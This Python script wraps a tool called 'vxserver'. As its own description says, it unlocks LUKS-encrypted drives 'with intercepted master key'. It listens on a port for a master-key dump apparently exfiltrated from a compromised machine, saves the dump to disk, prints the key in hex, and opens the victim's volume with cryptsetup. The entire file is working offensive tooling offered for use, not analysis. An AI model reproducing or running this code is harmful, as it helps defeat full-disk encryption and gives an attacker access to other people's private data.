#!/usr/bin/env python3
# Place this script to directory (bin/) that contains vxserver binary and keys.config (if generated)

import sys
import subprocess
import argparse
import os
import re
from secrets import token_hex

def safe_string(string: str) -> str:
    result = re.sub(r'[^a-zA-Z0-9]', '_', string)
    return result


def unlock_drive(drive: str, master_key: bytes, name: str) -> int:
    proc = subprocess.run(['cryptsetup', 'luksOpen', '--volume-key-file', '/dev/stdin', drive, name],
                          input=master_key, capture_output=False)
    return proc.returncode

def parse_mk_dump(stdout: str) -> bytes:
    stdout_lines = stdout.splitlines()
    mk_dump_hex = []
    in_mk_dump = False

    cipher_name = None
    cipher_mode = None
    payload_offset = None
    mk_bits = None
    for line in stdout_lines:
        if line.startswith('LUKS header information'):
            print(f'[*] Drive: {line.split()[-1]}')
            continue
        if line.startswith('Cipher name:'):
            cipher_name = line.split()[-1]
            print(f'[*] Cipher name: {cipher_name}')
            continue
        if line.startswith('Cipher mode:'):
            cipher_mode = line.split()[-1]
            print(f'[*] Cipher mode: {cipher_mode}')
            continue
        if line.startswith('Payload offset:'):
            payload_offset = line.split()[-1]
            print(f"[*] Payload offset: {payload_offset}")
            continue
        if line.startswith("UUID"):
            print(f"[*] UUID: {line.split()[-1]}")
            continue
        if line.startswith("MK bits:"):
            mk_bits = line.split()[-1]
            print(f"[*] Master key bits: {mk_bits}")
            continue
        if line.startswith('MK dump:'):
            in_mk_dump = True
            hex_part = line.split(":", 1)[1].strip()
            mk_dump_hex.extend(hex_part.split())
        
        if in_mk_dump and line.startswith(('\t', ' ')):
            mk_dump_hex.extend(line.split())
    
    mk_dump_hex_str = "".join(mk_dump_hex)
    mk_dump_bytes = bytes.fromhex(mk_dump_hex_str)
    print(f"[+] Master key length: {len(mk_dump_bytes)} bytes")
    print(f"[+] Master key (hex): {mk_dump_hex_str}")
    return mk_dump_bytes, cipher_name, cipher_mode, payload_offset, mk_bits

def read_keys(keys_path: str) -> tuple[str | None, str | None]:
    with open(keys_path, "r") as file:
        keys = file.readlines()
        if len(keys) != 2:
            print(f"[*] {keys_path} malformed. You need to generate keys first.")
            return None, None
        public_key_hex = keys[0].strip()
        private_key_hex = keys[1].strip()
    return public_key_hex, private_key_hex

def run_vxserver(public_key: str, private_key: str, port: int) -> str | None:
    proc = subprocess.run(['./vxserver', '-p', str(port), '-s', private_key, '-o', public_key], check=False, capture_output=True)
    if proc.returncode != 0:
        print(f"[!] An error occured while running vxserver (code {proc.returncode}): {proc.stderr}")
        return None
    return proc.stdout.decode()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="vxserver wrapper for automatic unlocking LUKS volumes with intercepted master key")
    parser.add_argument('-d', '--device', required=True, help="block device (or file) to unlock (/dev/vda3)",)
    parser.add_argument('-p', '--port', required=False, default=5000, help="port listen to", type=int)
    parser.add_argument('-k', '--keys', required=False, default="keys.config", help="keys pair file path")
    parser.add_argument('-n', '--name', required=False, default='decrypted_luks', help="name for the unlocked mapper device")
    parser.add_argument('-i', '--input', required=False, default=None, help="do not run vxserver; parse text file and unlock drive")
    args = parser.parse_args()

    keys_path = args.keys
    drive_path = args.device
    port = args.port
    mapper_name = args.name
    input_file = args.input

    if input_file:
        with open(input_file, "r") as file:
            mk_dump = file.read()
        master_key, cipher_name, cipher_mode, payload_offset, mk_bits = parse_mk_dump(mk_dump)
        status = unlock_drive(drive_path, master_key, mapper_name)
        if status == 0:
            print(f"[+] LUKS volume successfully unlocked as {mapper_name}!")
        else:
            print('[+] Failed to unlock LUKS drive.')
        exit(status)

    if port < 1 and port > 65535:
        print("[!] Wrong port specified.")
        exit(1)

    public_key_hex, private_key_hex = read_keys(keys_path)
    if private_key_hex is None:
        exit(1)

    captured_mk_dump = run_vxserver(public_key_hex, private_key_hex, port)
    if captured_mk_dump is None:
        exit(1)
    
    # For robustness lets write captured dump immediately
    file_path = f"mk_dump_{safe_string(mapper_name)}_{safe_string(drive_path)}_{token_hex(8)}"
    with open(file_path, "w") as file:
        file.write(captured_mk_dump)
        print(f"[+] Saved captured dump to {file_path}")
    
    master_key, cipher_name, cipher_mode, payload_offset, mk_bits = parse_mk_dump(captured_mk_dump)
    status = unlock_drive(drive_path, master_key, mapper_name)
    if status == 0:
        print(f"[+] LUKS volume successfully unlocked as {mapper_name}!")
    else:
        print('[+] Failed to unlock LUKS drive.')
    exit(status)